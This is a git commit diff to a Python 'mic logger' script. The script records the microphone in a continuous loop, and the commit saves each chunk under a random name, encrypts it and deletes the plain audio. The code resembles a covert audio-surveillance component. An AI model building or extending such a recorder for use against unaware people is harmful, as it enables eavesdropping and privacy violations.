0b891209c47789b4a050f79dcba84feeffe8a8b4
Ozan Gokberk <ozan8@hotmail.co.uk>
2025-07-26 13:38:24 +0100

    Mic logger encrypted

--- mic_logger.py
+++ mic_logger.py
@@ -3,19 +3,24 @@ from scipy.io.wavfile import write
 from datetime import datetime
 import os
 import time
+import uuid
+from encryptor import encrypt_file
 
 def mic_logger():
     os.makedirs("logs", exist_ok=True)
-    duration = 8
+    duration = 10
     sample_rate = 44100
 
     try:
         while True:
             recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)
             sd.wait()
-            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-            filename = f"logs/{timestamp}.wav"
+            unique_id = uuid.uuid4().hex
+            filename = f"logs/{unique_id}.wav"
             write(filename, sample_rate, recording)
-            time.sleep(10)
+            encrypted_filename = f"{filename}.enc" # add encrypted file
+            encrypt_file(filename, encrypted_filename) # encrypt function
+            os.remove(filename)
+            time.sleep(3)
     except KeyboardInterrupt:
         print("Mic logger stopped.")
